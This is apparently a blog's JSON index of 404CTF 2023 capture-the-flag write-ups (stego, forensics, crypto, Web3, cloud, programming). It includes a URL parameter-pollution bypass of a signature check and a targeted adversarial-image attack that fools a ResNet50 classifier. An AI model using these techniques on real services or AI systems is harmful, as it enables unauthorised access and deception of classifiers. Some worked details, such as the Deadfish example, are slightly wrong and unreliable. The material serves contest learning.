and then the lowercase.The flag format is 404CTF{le_message_que_vous_avez_trouvé}First Round404CTF{Un_cSecond Round404CTF{Un_cH1FFThird Round404CTF{Un_cH1FFrA9eFourth Round404CTF{Un_cH1FFrA9e_A55Fifth Round404CTF{Un_cH1FFrA9e_A55e2_bSixth Round404CTF{Un_cH1FFrA9e_A55e2bi3nSeventh Round404CTF{Un_cH1FFrA9e_A55e2_bi3n_d3PrLast Round404CTF{Un_cH1FFrA9e_A55e2_bi3n_d3PreCie}We obtained the flag !" }, { "title": "CTFs | 404CTF2023 | Hardware | Un courrier suspect", "url": "/CTFs/404CTF2023/hardware/un_courrier_suspect", "categories": "CTFs, 404CTF2023, Hardware", "tags": "CTFs, 404CTF2023, Hardware", "date": "2023-06-10 00:00:00 +0200", "snippet": "ContextWe are given the “bienvenue.circ” file.ResolutionLooking at the net, CIRC is a file extension commonly associated with Logisim Circuit files. This kind of file is used by “Logisim” software.We download the software (I chose the java version to not have problems on my VM) and we run it.java -jar logisim-generic-2.7.1.jar &amp;We open the “bienvenue.circ” file (File &gt; Open)We end up on the main page.There are 4 parts in this challenge. It’s an introduction so we guided to use the software.Part 1We just need to go on the tab “partie_1”.The flag begins with: 404CTF{L3_Part 2This part wants us to understand what a MUX is.A multiplexer, often referred to as a “MUX,” is a digital circuit that combines multiple input signals into a single output signal. It selects one of the input lines based on the control inputs and forwards that selected input to the output. The control inputs determine which input line is active and which data gets transmitted.The basic structure of a multiplexer consists of: Input lines: These are the data lines that carry the input signals. The number of input lines determines the number of inputs that can be connected to the multiplexer. These are the lines on the left of the MUX. Control inputs: These inputs determine which input line is selected. The number of control inputs determines the number of selection options available. In our case this is the line at the bottom of the MUX. Output line: This is the line where the selected input signal is transmitted. This is the line at the right of the MUX So, in order to have the value of the 3rd line transmitted to the output, we need to input 3 in the control inputs.Example the third input line (index 2) has a value of ‘6d’. If we input 2 in the control line, we get ‘6d’ outputed.Part 3This part is related to the second part. We have to get the values of the inputs lines of the MUX in the part 2 and report it on the ROM.Running ticks on the clock, we get the second part of the flag.Part 4In part we are given this MUX:We can reproduce what we did earlier with part 2 and part 3 to get the flagWe run the clock and we have got it 😁We concatenate our flag’s fragment: 404CTF{L3_M0m3nT_3St_V3nU_D3_54mus3r}The part 4 was not meant to be done that way I think. The idea was more to implement the blackbox in order to reproduce how the part 3 works and get the circuit with the MUX to work and display the flag.I hope you enjoyed this writeup and learned something 😊 !" }, { "title": "CTFs | 404CTF2023 | Steganography | Odobenus Rosmarus", "url": "/CTFs/404CTF2023/steganography/odobenus_rosmarus", "categories": "CTFs, 404CTF2023, Steganography", "tags": "CTFs, 404CTF2023, Steganography", "date": "2023-06-09 00:00:00 +0200", "snippet": "ContextThe text is:Ce soir je Célèbre Le Concert Electro Comme Louis Et Lou. Comme La nuit Commence Et Continue Clairement, Et Clignote Lascivement il Chasse sans Chausser En Clapant Encore Classiquement Les Cerclages du Clergé. Encore Car Encore, Louis Lou Entamant Longuement La Lullabile En Commençant Le Cercle Exhaltant de Club Comique Cannais Et Clermontois.ResolutionThe title “Odobenus Rosmarus” is the scientific name for “morse”. So, we can guess we have to find Morse code in the text.Looking at the text, we can notice that there words beginning with C, L, and E begins with an uppercase.Since we have to find Morse code, we can guess that C stands for “court” (short in frensh), L stands for “long” (same in frensh) and E stands for “espace” (space in frensh).We have “CCLCECLELCLCECCECLCCECECLCCECELLELLLECLCECCCEC”The Morse code is “..-. .- -.-. .. .-.. . .-.. . – — .-. … .”. We just have to decode it.ImplementationHere is my implementation to solve this challenge. I extract the uppercases from the text then I convert them to standard morse format (C -&gt; “.”, L -&gt; “-“, E -&gt; “ “). To finish, I decode the morse code to get the content of the flag.def decode_morse_code(morse_code: str) -&gt; str: \"\"\" Description: Decode a morse code message Input: morse_code (string) Output: decoded_message (string) \"\"\" morse_dict = {'.-': 'A', '-...': 'B', '-.-.': 'C', '-..': 'D', '.': 'E', '..-.': 'F', '--.': 'G', '....': 'H', '..': 'I', '.---': 'J', '-.-': 'K', '.-..': 'L', '--': 'M', '-.': 'N', '---': 'O', '.--.': 'P', '--.-': 'Q', '.-.': 'R', '...': 'S', '-': 'T', '..-': 'U', '...-': 'V', '.--': 'W', '-..-': 'X', '-.--': 'Y', '--..': 'Z', '.----': '1', '..---': '2', '...--': '3', '....-': '4', '.....': '5', '-....': '6', '--...': '7', '---..': '8', '----.': '9', '-----': '0'} words = morse_code.split(' / ') decoded_message = '' for word in words: characters = word.split() for char in characters: if char in morse_dict: decoded_message += morse_dict[char] decoded_message += ' ' return decoded_message.strip()text = \"Ce soir je Célèbre Le Concert Electro Comme Louis Et Lou. Comme La nuit Commence Et Continue Clairement, Et Clignote Lascivement il Chasse sans Chausser En Clapant Encore Classiquement Les Cerclages du Clergé. Encore Car Encore, Louis Lou Entamant Longuement La Lullabile En Commençant Le Cercle Exhaltant de Club Comique Cannais Et Clermontois.\"# Extract the majusculesmaj = \"\"for c in text: if c.isupper(): maj += cprint(\"Majuscules: \", maj)# Convert from CLE to morse codemorse = \"\"for c in maj: if c == \"C\": morse += \".\" elif c == \"L\": morse += \"-\" elif c == \"E\": morse += \" \"print(\"Morse: \", morse)# Decode the morse codemessage = decode_morse_code(morse)print(\"Message: \", message)Output:The flag is: 404CTF{FACILELEMORSE}" }, { "title": "CTFs | 404CTF2023 | Steganography | Les Félicitations", "url": "/CTFs/404CTF2023/steganography/les_felicitations", "categories": "CTFs, 404CTF2023, Steganography", "tags": "CTFs, 404CTF2023, Steganography", "date": "2023-06-09 00:00:00 +0200", "snippet": "ContextWe are given a text and we have to find congratulations in it.Here is the text:Tous étaient réunis dans la salle,Criblant leur feuille de mots et posant leurs esprits sur papier.Très encouragés par le déroulement des opérations,Il suffisait simplement de les regarder pour voir leur dévotion.-.. . -.-. --- -.. . -- --- .-. ... . -.-. . ... - ... -.-- -- .--. .-Beaucoup d'entre eux étaient fiers de leur oeuvreCillant à peine quand dehors, un monstre jappaitFierté mène cependant à orgueilEt n'oubliez pas qu'orgueil mène à perte.-- .- .. ... .-.. .- -.-. .- ... . .-. - .- .-. .. . -. .... .- .... .-Juste au moment où leurs travaux allaient finir,Hors du laboratoire, un cri retentissant fut émisPeu d'humains avaient entendu ce genre de cris.Exténués par cette énième attaque, les scientifiques se remirent au travail.The morse code is useless, it’s just a delimiter.I struggled a lot on this challenge. My first idea was pick a word in each paragraph in order to create a sentence of 3 words. After a lot of research, it ends up with nothing.Then I found in the first paragraph that if I pick the 1st letter of the 1st line, the 2nd letter of the 2nd line, the 3rd letter of the 3rd line, the 4th line of the 4th line, I get the “Très”.By doing the same thing of the other 2 paragraphs, I get the words “Bien” and “Joué”.Congratulations sentence: “Très Bien Joué”.The flag is: 404CTF{TrèsBienJoué}" }, { "title": "CTFs | 404CTF2023 | Steganography | L'Oeuvre", "url": "/CTFs/404CTF2023/steganography/l_oeuvre", "categories": "CTFs, 404CTF2023, Steganography", "tags": "CTFs, 404CTF2023, Steganography", "date": "2023-06-09 00:00:00 +0200", "snippet": "ContextWe are given an image, l_oeuvre.png.I tried to use binwalk, zsteg and other stuffs but I couldn’t find anything.I finally used Aperi’Solve and got this output:We’ve got the flag 🎊 !Flag: 404{C3z4nne3_ouVr3_To1}" }, { "title": "CTFs | 404CTF2023 | Forensic | Pêche au livre", "url": "/CTFs/404CTF2023/forensic/peche_au_livre", "categories": "CTFs, 404CTF2023, Forensic", "tags": "CTFs, 404CTF2023, Forensic", "date": "2023-06-09 00:00:00 +0200", "snippet": "ContextWe are given a network packet capture, let’s open it with Wireshark.There are 5 TCP conversations on port 80, It must be a web server:Looking at the Protocol Hierarchy, we can confirm that HTTP is used:Looking at the conversations (Follow TCP stream), we can see that several images are transfered from the server to the client.Let’s download them (File &gt; Export Objects &gt; HTTP).Let’s take a look at them:We’ve got the flag 🎉 !!We can use an online OCR (Optical Character Recognition) to retrieve the flag:404CTF{345Y_W1r35h4rK}I hope you enjoyed this writeup 😊 !" }, { "title": "CTFs | 404CTF2023 | Forensic | Le Mystère du roman d'amour", "url": "/CTFs/404CTF2023/forensic/le_mystere_du_roman_d_amour", "categories": "CTFs, 404CTF2023, Forensic", "tags": "CTFs, 404CTF2023, Forensic", "date": "2023-06-09 00:00:00 +0200", "snippet": "ContextWe are given fichier-etrange.swp.The goal is to find: the PID of the crashed processus the path to the file the username the machine name the content of the txt file.ResolutionA SWP file, also known as a Swap file, is a type of temporary file used to supplement the system’s physical memory (RAM) by providing additional virtual memory.In the context of the Vim text editor, a .swp file is a temporary file created by Vim to store changes made to a file while it is being edited. When you open a file in Vim, it creates a corresponding .swp file in the same directory to serve as a backup and recovery mechanism.Running the file command, we can recover a lot of informations:We have: the PID -&gt; 168 the username -&gt; jacqueline the hostname -&gt; aime_ecrire the path to the file -&gt; ~jaqueline/Documents/Livres/404 Histoires d’Amour pour les bibliophiles au coeur d’artichaut/brouillon.txtWe still have to get the content of the txt file.We can recover the file by running: vim -r fichier-etrange.swpWe press Enter and save the file (:wq). We cannot save the file because the file structure does not exist:We create the right file structure and do it again.Now we have the file extracted:It’s a PNG image:Nothing interesting on it:I used Aperi’solve to check whether the image hide something.It’s a qr code:It gives us the text to enter in the flag.Final flag: 404{168-~jaqueline/Documents/Livres/404 Histoires d’Amour pour les bibliophiles au coeur d’artichaut/brouillon.txt-jaqueline-aime_ecrire-3n_V01L4_Un_Dr0l3_D3_R0m4N}I hope you liked this writeup 🤗 !" }, { "title": "CTFs | 404CTF2023 | Crypto | Recette", "url": "/CTFs/404CTF2023/crypto/recette", "categories": "CTFs, 404CTF2023, Crypto", "tags": "CTFs, 404CTF2023, Crypto", "date": "2023-06-08 00:00:00 +0200", "snippet": "ContextResolutionHere are given a code sequence and instructions to decode it.From hexWe have to decode the code from hex, here is my code to do it:import binasciicode = \"32 69 31 73 34 69 31 73 31 35 64 31 6f 34 39 69 31 6f 34 64 31 6f 33 69 31 6f 31 35 64 31 6f 32 32 64 31 6f 32 30 64 31 6f 31 39 69 31 6f 37 64 31 6f 35 64 31 6f 32 69 31 6f 35 35 69 31 6f 31 64 31 6f 31 39 64 31 6f 31 37 64 31 6f 31 38 64 31 6f 32 39 69 31 6f 31 32 69 31 6f 32 36 69 31 6f 38 64 31 6f 35 39 64 31 6f 32 37 69 31 6f 36 64 31 6f 31 37 69 31 6f 31 32 64 31 6f 37 64 31 6f 35 69 31 6f 31 64 31 6f 32 64 31 6f 31 32 69 31 6f 39 64 31 6f 32 36 64 31 6f\"step1 = ''.join(code.split(\" \"))step1 = binascii.unhexlify(step1).decode()print(\"\\nStep 1: Convertir depuis l'hexadécimal\")print(step1)Here is the output:Expand so that you no longer see numbersExamples: 2i becomes ii. 4s becomes ssss.My implementation:step2 = \"\"num = \"\"for index in range(len(step1)): if step1[index] in numbers: num += step1[index] try: if step1[index + 1] not in numbers: step2 += step1[index + 1] * int(num) num = \"\" index += 1 except: passprint(\"\\nStep 2: Développer de sorte à ne plus voir de chiffres\")print(step2)Here is the output:Decode the DeadFishThe “Deadfish” is a simple programming language created as a joke or educational tool to demonstrate basic programming concepts. It is designed to be intentionally minimalistic and limited in functionality.In Deadfish, there are only four commands, represented by the letters “i”, “d”, “s”, and “o”:\"i\" (increment): This command increases a value by 1.\"d\" (decrement): This command decreases a value by 1.\"s\" (square): This command squares a value.\"o\" (output): This command prints the value to the console.The Deadfish language operates on a single accumulator, initially set to zero. Each command is executed sequentially, and the output command will display the value of the accumulator.For example, let’s say we have the Deadfish code: “iiisdoso”. Here’s what each command does: “i”: Increment the accumulator from 0 to 1. “i”: Increment the accumulator from 1 to 2. “i”: Increment the accumulator from 2 to 3. ”s”: Square the accumulator, resulting in 9. “d”: Decrement the accumulator from 9 to 8. “o”: Output the value 8.So, running the Deadfish code “iiisdoso” would display the number 8 as the output.Deadfish is an example of an esoteric programming language, which means it’s not designed for practical use but rather for experimentation, amusement, or to explore unconventional programming concepts. Its simplicity and limited functionality make it an interesting starting point for learning about programming language design and the fundamentals of interpreting and executing code.I found a repo online to decode the DeadFish: https://github.com/wanqizhu/deadfish-encoderMy code to decode the DeadFish:class Node(): def __init__(self, num): self.num = num self.edges = [] self.visited = Falsenodes = [Node(i) for i in range(256)]for i in range(1, 16): nodes[i].edges.append((nodes[i-1], 'd')) nodes[i].edges.append((nodes[i+1], 'i')) nodes[i].edges.append((nodes[i**2], 's'))for i in range(16, 255): nodes[i].edges.append((nodes[i-1], 'd')) nodes[i].edges.append((nodes[i+1], 'i'))nodes[0].edges.append((nodes[0], 'd'))nodes[0].edges.append((nodes[1], 'i'))nodes[255].edges.append((nodes[255], 'd'))nodes[255].edges.append((nodes[0], 'i'))nodes[16].edges.append((nodes[0], 's'))DP = {}def BFS(nodes, s, t): if (s, t) in DP: return DP[(s, t)] + 'o' for n in nodes: n.visited = False queue = [(nodes[s], '')] while queue: v, path = queue.pop(0) v.visited = True if v.num == t: DP[(s, t)] = path return path + 'o' for (node, c) in v.edges: if not node.visited: queue.append((node, path+c)) DP[(s, node.num)] = path+c# BFS(nodes[13], nodes[127])def encode(s, start=0): \"\"\" Encodes input string s into deadfish \"\"\" targets = [start] + [ord(c) for c in s] out = \"\" for i in range(len(s)): out += BFS(nodes, targets[i], targets[i+1]) return outdef decode(s, accumulator=0): out = \"\" for cmd in s: if accumulator == 256 or accumulator == -1: # Overflow, reset accumulator accumulator = 0 # Process input if cmd == 'i': accumulator += 1 # Increment elif cmd == 'd': accumulator += -1 # Decrement elif cmd == 'o': out += chr(accumulator) # Output elif cmd == 's': accumulator *= accumulator # Square return out, accumulatorstep3 = decode(step2)print(\"\\nStep 3: Décoder le DeadFish\")print(step3)Here is the output:Convert from Base 85For this step, we just use the base64 library:step4 = base64.a85decode(step3[0]).decode()print(\"\\nStep 4: Convertir depuis la Base 85\")print(step4)We’ve got the flag !" }, { "title": "CTFs | 404CTF2023 | Crypto | Dessine-moi une courbe elliptique", "url": "/CTFs/404CTF2023/crypto/dessine_moi_une_courbe_elliptique", "categories": "CTFs, 404CTF2023, Crypto", "tags": "CTFs, 404CTF2023, Crypto, Elliptic Curve", "date": "2023-06-08 00:00:00 +0200", "snippet": "ContextWe are given the code used to crypt the flag and some other informations.CodeHere is the code given:from sage.all import EllipticCurve, GFimport hashlibfrom Crypto.Cipher import AESfrom secret import FLAGfrom os import urandomp = 231933770389389338159753408142515592951889415487365399671635245679612352781a = ?b = ?determinant = 4 * a**3 + 27 * b**2assert determinant != 0E = EllipticCurve(GF(p), [a,b])G = E.random_point()H = E.random_point()print(G.xy()[0], G.xy()[1])print(H.xy()[0], H.xy()[1])print(p)iv = urandom(16)key = str(a) + str(b)aes = AES.new(hashlib.sha1(key.encode()).digest()[:16], AES.MODE_CBC, iv=iv)cipher = aes.encrypt(FLAG)print(cipher.hex())print(iv.hex())The flag is crypted using AES. The key used in the encryption is key = str(a) + str(b).So, in order to find the key, we need to find a et b.Resolutiona and b are the coefficients of an elliptic curve defined over a finite field. They determine the shape and properties of the curve.The code asserts that the determinant of the curve, calculated using determinant = 4 * a**3 + 27 * b**2, is not zero. This check ensures that the curve is non-singular and can be used for cryptographic operations.After defining the elliptic curve E using the coefficients a and b, the code generates two random points G and H on the curve.In the code p is the prime modulus of the finite field over which the curve is defined.We know that sage uses the Weierstrass equation for the elliptic curve.So, we have:G_y ** 2 = G_x ** 3 + a * G_x + bH_y ** 2 = H_x ** 3 + a * H_x + bBy isolating b,G_y ** 2 - G_x ** 3 - a * G_x = H_y ** 2 - H_x ** 3 - a * H_xa * G_x - a * H_x = G_y ** 2 - G_x ** 3 - H_y ** 2 + H_x ** 3a * (G_x - H_x) = (G_y ** 2 - G_x ** 3) - (H_y ** 2 - H_x ** 3)So, we havea = (G_y ** 2 - G_x ** 3) - (H_y ** 2 - H_x ** 3) / (G_x - H_x)b = G_y ** 2 - G_x ** 3 - a * G_xImplementationI defined a function to ensure the results of each operations are modulo p:def moins(x, y, p): return (x % p - y % p + p) % pWe calculate a and b:# Solve for aa = moins(moins(G_y ** 2, H_y ** 2, p), moins(G_x ** 3, H_x ** 3, p), p) * pow(moins(G_x, H_x, p), -1, p) % p# Solve for b using one of the expressions for bb = moins(G_y ** 2, G_x ** 3, p)b = moins(b, a * G_x % p, p)We can now decrypt the flag:key = str(a) + str(b)aes = AES.new(hashlib.sha1(key.encode()).digest()[:16], AES.MODE_CBC, iv=iv)flag = aes.decrypt(secret_message)print(flag.decode())Output:" }, { "title": "CTFs | 404CTF2023 | Web3 | L'Antiquaire, tête en l'air", "url": "/CTFs/404CTF2023/web3/l_antiquaire_tete_en_l_air", "categories": "CTFs, 404CTF2023, Web3", "tags": "CTFs, 404CTF2023, Web3", "date": "2023-06-07 00:00:00 +0200", "snippet": "ContextWe have to find the password of this person.We have the memorandum.txt file.This file is a Memo. A Memo is a short message or description that is attached to a transaction or interaction on a blockchain network.When you perform a transaction on a blockchain network, such as sending cryptocurrency tokens from one address to another, you may have the option to include a memo. The memo is an optional field where you can include additional information about the transaction.ResolutionThe memo is in hexadecimal, we need to decode it.import binasciiwith open('memorandum.txt', 'r') as f: memo = f.read()memo_bytes = binascii.unhexlify(memo)print(memo_bytes)At the end of the decoded text, there is:We have this URL: https://shorturl.ac/mysecretpassword that is a Rick Roll.We this other kind of endpoint:/ipfs/bafybeia5g2umnaq5x5bt5drt2jodpsvfiauv5mowjv6mu7q5tmqufmo47i/metadata.jsonBy searching the net, I learned that IPFS (InterPlanetary File System) is a peer-to-peer distributed file system designed to create a more decentralized and resilient web infrastructure. It is a protocol that enables the storage and retrieval of files on a global scale without relying on traditional centralized servers.Thanks to this site, we know how to use it: https://decrypt.co/resources/how-to-use-ipfs-the-backbone-of-web3I searched for it on ipfs.io:https://ipfs.io/ipfs/bafybeia5g2umnaq5x5bt5drt2jodpsvfiauv5mowjv6mu7q5tmqufmo47i/metadata.jsonWe end up on this JSON file:Another file is mentionned (ipfs://bafybeic6ea7qi5ctdp6s6msddd7hwuic3boumwknrirlakftr2yrgnfiga/mystere.png).We access the file the same way.It looks like a token for an account. I found on the net that Sepolia is a blockchain.I searched for the account we have on https://sepolia.etherscan.io/In the “Contracts” tab, in the Constructor Arguments, there is the flag !!" }, { "title": "CTFs | 404CTF2023 | Web3 | Art", "url": "/CTFs/404CTF2023/web3/art", "categories": "CTFs, 404CTF2023, Web3", "tags": "CTFs, 404CTF2023, Web3", "date": "2023-06-07 00:00:00 +0200", "snippet": "ContextWe have to find the artist’ address Ethereum.ResolutionI used OpenSea website to find the artwork.I searched for “blanc avec des liserés blancs transversaux” that seems to be the name of the NFT bought.These are the first results:The single color NFTs belongs are owned by Antrios who the artist mentionned in the initial statement.On his profile, we get his Ethereum address.The flag is 404CTF{0xD7186D588Ed2AddF8b260d09B108100f264A64A9}" }, { "title": "CTFs | 404CTF2023 | Cloud | Le Sot", "url": "/CTFs/404CTF2023/cloud/le_sot", "categories": "CTFs, 404CTF2023, Cloud", "tags": "CTFs, 404CTF2023, Cloud", "date": "2023-06-07 00:00:00 +0200", "snippet": "ContextResolutionBy going on the URL:https://cloud-intro-challenge.s3.gra.io.cloud.ovh.net/I end up on this page:Inside the Key tag, the value is les-moutons.json.So, I enter the URL:https://cloud-intro-challenge.s3.gra.io.cloud.ovh.net/les-moutons.jsonAt the bottom of the page is the flag." }, { "title": "CTFs | 404CTF2023 | Ai | Le Petit Chat", "url": "/CTFs/404CTF2023/ai/le_petit_chat", "categories": "CTFs, 404CTF2023, Ai", "tags": "CTFs, 404CTF2023, Ai, Adversarial Attack", "date": "2023-06-07 00:00:00 +0200", "snippet": "ContextWe have been provided with an image of a cat and the code utilized by the server to verify whether the AI predicts a teapot and ensure that the image hasn’t been excessively altered.CodeHere is the code:# Python 3.11.3import numpy as npimport tensorflow as tffrom urllib import requestfrom PIL import Imagefrom TresTresSecret import drapeaudef main(file): je_merite_le_drapeau = True chat_modifie = Image.open(file) # Modèle utilisé : ResNet50 de TensorFlow model = tf.keras.applications.resnet50.ResNet50(weights='imagenet') # Mise du chat dans le réseau image_raw = tf.io.read_file(file) image = tf.image.decode_image(image_raw) # Prétraitement de l'image : on utilise directement la fonction de ResNet50 image = tf.cast(image, tf.float32) image = tf.image.resize(image, (224, 224)) image = tf.keras.applications.resnet50.preprocess_input(image) image = image[None, ...] # Prédiction de l'image image_probs = model.predict(image) _, image_class, class_confidence = tf.keras.applications.resnet50.decode_predictions(image_probs, top=1)[0][0] # On vérifie que c'est bien une théière if image_class != 'teapot': je_merite_le_drapeau = False # On cherche le vrai chat chat = Image.open('chat.jpg') taille = chat.size # On utilise la norme L2 def distance(a, b): return np.linalg.norm(np.array(a) - np.array(b)) # On vérifie enfin si le chat n'a pas été trop ~modifié~~ eps = 70 for x in range(taille[0]): for y in range(taille[1]): if distance(chat.getpixel((x, y)), chat_modifie.getpixel((x, y))) &gt; eps: je_merite_le_drapeau = False if je_merite_le_drapeau: print(f'Je mérite le drapeau. Le voici : {drapeau}') else: print('Je ne mérite pas le drapeau')try: url = input('URL du chat &gt; ') file = request.urlretrieve(url)[0] main(file)except Exception as e: print(f'Je n\\'ai pas récupéré ton chat ! {str(e)}')The code asks the user to enter the image URL and retrieve the image from the url provided.Then it makes a prediction for the image using the ai. If the image is predicted as teapot, it verifies that we did not modifie the image too much.The code iterates over each pixel of the image and calculate the distance between the 2 colors. To do this, each (r, g, b) value is considered as a vector. It calculates the difference between the pixel vector of the original cat and the pixel vector of the modified cat. Then it calculates the norm of the resulting vector. The L2 norm is used in this case, which means that the coordinates are squared, summed, and then the square root is taken to obtain the final length.If the length of this resulting norm is superior to 70, we modified too much.So, we have to make small changes to each pixel in order to make the AI predict the image is a teapot.Adversarial AttacksAfter some research, I stumbled upon this colab: Adversarial AttacksThis colab / article explains what is an Adversarial Attack and how to do it.Adversarial attacks are techniques used to manipulate the behavior of machine learning models by making imperceptible changes to input data. These changes are carefully crafted to deceive the model into producing incorrect or unintended outputs. Adversarial attacks exploit vulnerabilities in the way machine learning models generalize from training data.In the colab, they perform a Fast Gradient Sign Method (FGSM), an untargeted attack, which means that they try to increase the ground truth error in order for the model to predict any other class.Then they perform a Patch Adversarial attack. The patch adversarial attack is a type of adversarial attack where a small, specifically crafted patch is added to an image to deceive a machine learning model. The patch is designed to cause misclassification or induce a desired behavior in the model when it encounters images with the patch.In our case, we cannot use this type of targeted attack because it would modify too much the pixel values.In the untargeted attack they perform, they compute the gradient and modify the image pixels in order to increase the loss. It is the inverse of the gradient descent.Objective: Gradient Descent: The objective of gradient descent is to minimize a loss function by iteratively adjusting the model parameters in the direction of steepest descent. Adversarial Attacks: The objective of adversarial attacks is to manipulate the behavior of a machine learning model by generating input examples that induce misclassification or desired behaviors. Direction of Optimization: Gradient Descent: It optimizes the model parameters in the direction of decreasing loss by computing gradients with respect to the model parameters. Adversarial Attacks: It optimizes the input examples in the direction that maximizes the model’s loss or causes a specific behavior, typically by computing gradients with respect to the input. Goal: Gradient Descent: The goal of gradient descent is to find the optimal set of model parameters that minimize the loss on the training data and improve the model’s generalization. Adversarial Attacks: The goal of adversarial attacks is to exploit vulnerabilities in the model’s decision-making process, potentially causing misclassification or influencing the model’s behavior. Optimization Process: Gradient Descent: It typically involves computing gradients of the loss function with respect to the model parameters and updating the parameters in the opposite direction of the gradients. This process is repeated iteratively until convergence. Adversarial Attacks: It often uses optimization techniques, such as gradient-based methods, to find perturbations that maximize the loss or influence the model’s behavior. The optimization process iteratively adjusts the perturbations until the desired effect is achieved. Inputs and Outputs: Gradient Descent: It takes input features and corresponding labels as input and aims to optimize the model’s parameters to predict the correct labels. Adversarial Attacks: It takes input examples and aims to modify them in a way that causes misclassification or induces specific behaviors from the model. The first attack presented in the article can still be used. Here they increase the loss of the ground truth class. We can perform a targeted attack by choosing a class and making changes to pixels in order to reduce the loss for this class.After digging the net, I stumbled upon this github that is truly fantastic: Targeted Adversarial AttacksWe just download the repo, install the requirements and run this command:python generate_adversarial_example_targeted.py &lt;input_file_name&gt; &lt;target_class_name&gt;We input the cat image given and select the teapot class.The program will perform 300 iterations. Each iteration calculate the loss for the teapot class, calculate the gradient and make the right changes to the pixel values in order to reduce the loss associated with the teapot class.After the 300 iterations, it saves the image obtained.Here is the original image:Here is the modified image:The model predicts a teapot with a confidence of 99.9%.I uploaded the image online (https://www.noelshack.com/) and send the url to server via netcat.We’ve got the flag. I hope you learned a lot in this writeup. I discovered something I had no idea it existed thanks to this challenge." }, { "title": "CTFs | 404CTF2023 | Ai | De la poésie", "url": "/CTFs/404CTF2023/ai/de_la_poesie", "categories": "CTFs, 404CTF2023, Ai", "tags": "CTFs, 404CTF2023, Ai", "date": "2023-06-07 00:00:00 +0200", "snippet": "Here is the context:We are given the file “poeme.zip”. Inside of it, there are images of hand written numbers:It is the dataset MNIST, a known dataset in deep learning.I found this colab online that trains a CNN on this dataset: MNISTI put the poeme.zip file on my drive and added this code at the end of the colab:from google.colab import drivedrive.mount('/content/drive')!cp drive/MyDrive/poeme.zip .!unzip poeme.zipimport osfrom PIL import Imagefrom torchvision.transforms import ToTensorpredictions = []work_dir = os.getcwd() for i in range(6536): img_path = os.path.join(work_dir, 'images', str(i) + '.jpg') img = Image.open(img_path).convert('L') img = ToTensor()(img) img = img.unsqueeze(0) pred_result = cnn.predict(img) predictions.append(str(pred_result[0]))print(''.join(predictions))I trained the AI and got the predictions for the numbers.I put the result in a txt file named “code.txt”.The name of the book where the “poeme” is from is called “Être pair ou ne pas l’être” (to be even or not to be).I thought maybe we have to replace each number in the sequence by 1 if the number is odd and 0 if the number is even to form bits.with open(\"code.txt\", \"r\") as f: data = f.read()bits = []for char in data: if int(char) % 2 == 0: bits += \"0\" else: bits += \"1\"print(bits)There are 6536 images which is a multiple of 8. So I can form bytes by grouping them by 8 bits.# create groups of 8 charactersgroups = [bits[i:i+8] for i in range(0, len(bits), 8)]groups = [\"\".join(group) for group in groups]print(groups)Then I can try to form ascii characters by considering that the numbers obtained are ascii codes.# convert to asciiascii_values = [int(group, 2) for group in groups]print(ascii_values)# get the charactersascii_values = [chr(group) for group in ascii_values]print(ascii_values)# convert to stringstring = \"\".join(ascii_values)print(string)We kind of retrieved the poeme:Et2e pair ou ne paS lettreLâhomme, dont la vie entiÃ¨reEst de 96 ans,Dort le 1/3 de sa carriÃ¨re,Ã'est juste 32 ans.Ajoutons pour ma|adies,Procès, voyages, accidentsAu moins 1/4 de la vieC'ast0encore 2 foi3 12 ans.Par!jour 2 heuRes d'étudesOu de travaux - foNt 8 ans,Noirs chagrins, inquiétudesPour le double vont 16 ans.Pour affaires qu'on projette1/2-heure, - encobe 2 aîs.5/4 d'heures de toiletteBarbe et caetera - 7 ans.JPar jour pour manger et boire2 font bien 8 ans.Cela porte le mémoireJusqu'à 95 ans.Rdste encorm 1 an pour faireCe qu'oiseaux font au printemps.Par jour l'homme a donc sur terre1/4 d'heure de bon temps.Juste assez pour déposE2 le drapeau sur le 424CTF : 404CTF{d#_L4_p03S1e_qU3lqU3_P;u_C0nT3mp0r4in3}oème original : Le quast d'heure de bon temps Nicolas Boileau$There are a lot of errors. The AI did not well recognized some numbers so we do not get the good ascii character.The flag is understable, we can guess which letters are not good.Final flag: 404CTF{d3_L4_p03S1e_qU3lqU3_P3u_C0nT3mp0r4in3}I hope you enjoyed this writeup. If you want to know more about CNNs, there are a lot of great articles out there. Take your time to read it." }, { "title": "CTFs | 404CTF2023 | Web | Fuite en 1791", "url": "/CTFs/404CTF2023/web/fuite_en_1791", "categories": "CTFs, 404CTF2023, Web", "tags": "CTFs, 404CTF2023, Web, Parameter Pollution", "date": "2023-06-06 00:00:00 +0200", "snippet": "ContextThe goal is to read the ddfc.By clicking the link, we end up on this page:The page contains a link to this URL:https://ddfc.challenges.404ctf.fr/ddfc?expiry=-5625891076&amp;signature=wawF6dC4Hz9g5NyCc3j1KCDcfztFE/spThis is the page we obtain:The link is expired. As the title mentionned, the link is supposed to be valid a week. Here the time stamp indicate the date 21 september 1791:We need to find a way to modify the expiry parameter in the URL.After a lot of struggling, trying to understand how the signature is formed, I thought that we could do parameter pollution.So, I tried to add an expiry parameter:https://ddfc.challenges.404ctf.fr/ddfc?expiry=-5625891076&amp;signature=wawF6dC4Hz9g5NyCc3j1KCDcfztFE/sp&amp;expiry=I get this page:It looks like the second expiry parameter is used instead of the first one. Does it validate the signature though?I tried to add a big positive value as expiry parameter:https://ddfc.challenges.404ctf.fr/ddfc?expiry=-5625891076&amp;signature=wawF6dC4Hz9g5NyCc3j1KCDcfztFE/sp&amp;expiry=5625891076We get the page 🎉 !We can find the flag at the bottom of the page:I hope you enjoyed this challenge !" }, { "title": "CTFs | 404CTF2023 | Programmation | L'innondation", "url": "/CTFs/404CTF2023/programmation/l_innondation", "categories": "CTFs, 404CTF2023, Programmation", "tags": "CTFs, 404CTF2023, Programmation", "date": "2023-06-06 00:00:00 +0200", "snippet": "Here is the context:The challenge asks us to count rhinoceros. Let’s connect via netcat to understand what it is about.Here is what we get when we connect:We have to count the number of rhinoceros ~c`°^) in the text and send the answer within seconds.The fact is that it will ask us to do it several times so we have to make an infinite while loop to count each wave of rhinoceros.Here is the code I wrote:import pwnimport re# connect to the serverr = pwn.remote('challenges.404ctf.fr', 31420)iter = 0while True: print(\"Iteration: \" + str(iter)) iter += 1 try: # receive the response response = r.recvuntil(b'&gt;') print(response.decode()) # count the number of ~c`°^) in the response count = len(re.findall(r'~c`°\\^\\)', response.decode())) print(\"Count: \" + str(count)) # send the count r.sendline(bytes(str(count), 'utf-8')) except: break# receive the flagresponse = r.recvuntil(b'}')print(response.decode())For each loop iteration, we receive until the character ‘&gt;’ so we know we have the full response. Then we count the number of rhinoceros using regex. We send the count.When we reach the end, the character ‘&gt;’ will not be in the response. It will raise an error because it takes too 